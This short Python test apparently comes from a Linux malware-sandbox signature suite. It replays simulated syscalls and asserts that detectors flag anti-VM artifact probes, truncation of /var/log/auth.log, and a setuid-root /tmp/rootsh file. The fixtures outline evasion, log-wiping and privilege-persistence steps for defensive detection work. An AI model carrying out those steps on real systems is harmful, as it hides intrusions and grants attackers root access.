    t.syscall("stat64", ret=ENOENT, filename="/proc/xen", statbuf="0x1")
    t.syscall("lstat64", ret=ENOENT, filename="/sys/hypervisor/type", statbuf="0x1")
    t.syscall("openat2", ret=ENOENT, dfd="0xffffff9c", filename="/proc/scsi/scsi", how="0x1", size="0x18")
    t.syscall("faccessat2", ret=ENOENT, dfd="0xffffff9c", filename="/dev/vboxguest", mode="0x0", flags="0x0")
    t.syscall("truncate64", path="/var/log/auth.log", length_lo="0x0", length_hi="0x0")
    t.syscall("fchmodat2", dfd="0xffffff9c", filename="/tmp/rootsh", mode="0x9ed", flags="0x0")
    t.syscall("chown32", filename="/tmp/rootsh", user="0x0", group="0x0")
    names = run(t, tmp_path)
    assert {e["file"] for e in entries(names["linux_antivm_artifacts"])} == \
        {"/proc/xen", "/sys/hypervisor/type", "/proc/scsi/scsi", "/dev/vboxguest"}
    assert {"file": "/var/log/auth.log", "operation": "truncate", "process": "s.elf (100)"} in \
        entries(names["linux_log_tampering"])
    assert "/var/log/auth.log" in {e["DeletedFile"] for e in entries(names["deletes_files"])}
    assert entries(names["linux_setuid_setgid"])[0]["file"] == "/tmp/rootsh"
